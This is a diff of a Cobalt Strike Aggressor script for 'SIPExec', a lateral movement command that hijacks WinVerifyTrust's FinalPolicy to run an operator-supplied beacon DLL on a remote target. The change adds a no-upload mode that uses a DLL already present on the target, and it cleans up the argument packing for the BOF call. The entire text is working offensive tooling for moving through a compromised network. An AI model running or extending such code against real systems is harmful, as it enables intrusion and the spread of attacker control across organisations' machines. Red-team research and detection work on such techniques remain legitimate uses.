@@ -227,7 +227,7 @@ beacon_command_register(
 );
 
 # ================================================================
-# SIPExec — Lateral movement via WinVerifyTrust FinalPolicy hijack
+# SIPExec -- Lateral movement via WinVerifyTrust FinalPolicy hijack
 # ================================================================
 
 # ---- jump sipexec ----
@@ -235,7 +235,7 @@ beacon_command_register(
 # Operator must supply the beacon DLL.
 
 sub sipexec_jump_invoke {
-    local('$bid $target $dll_path $share $guid $no_cleanup $func $no_upload $args $bof_data $handle');
+    local('$bid $target $dll_path $share $guid $no_cleanup $func $no_upload $args $bof_data $handle $dll_data');
     $bid = $1;
     $target = $2;
     $dll_path = $3;
@@ -250,7 +250,27 @@ sub sipexec_jump_invoke {
         return;
     }
 
-    # Read DLL file
+    if ($no_upload) {
+        # --no-upload: treat dll_path as the path ON TARGET, don't read file
+        btask($bid, "SIPExec jump -> $target via FinalPolicy hijack (no-upload: $dll_path )", "T1553.003");
+
+        $args = bof_pack($bid, "szzbzzzzss",
+            0,                   # mode = jump
+            $target,
+            "",                  # command
+            "",                  # dll_data empty
+            $dll_path,           # dll_path_override = path on target
+            $share,
+            $guid,
+            $func,
+            $no_cleanup,
+            1                    # no_upload
+        );
+        tmb_exec("tmb_sipexec", $bid, $args);
+        return;
+    }
+
+    # Upload mode: read DLL file
     $handle = openf($dll_path);
     if ($handle is $null) {
         berror($bid, "Cannot open DLL: $dll_path");
@@ -264,20 +284,19 @@ sub sipexec_jump_invoke {
         return;
     }
 
-    btask($bid, "SIPExec jump → $target via FinalPolicy hijack", "T1553.003");
+    btask($bid, "SIPExec jump -> $target via FinalPolicy hijack", "T1553.003");
 
-    # Pack: mode(s) target(z) command(z) dll_data(b) dll_path_override(z) share(z) guid(z) func(z) no_cleanup(s) no_upload(s)
     $args = bof_pack($bid, "szzbzzzzss",
         0,                   # mode = jump
-        $target,             # target
-        "",                  # command (empty for jump)
+        $target,
+        "",                  # command
         $dll_data,           # dll_data binary
-        "",                  # dll_path_override (empty = upload)
-        $share,              # share
-        $guid,               # guid alias
-        $func,               # function name
-        $no_cleanup,         # no_cleanup
-        $no_upload           # no_upload
+        "",                  # dll_path_override empty
+        $share,
+        $guid,
+        $func,
+        $no_cleanup,
+        0                    # no_upload = false
     );
 
     tmb_exec("tmb_sipexec", $bid, $args);
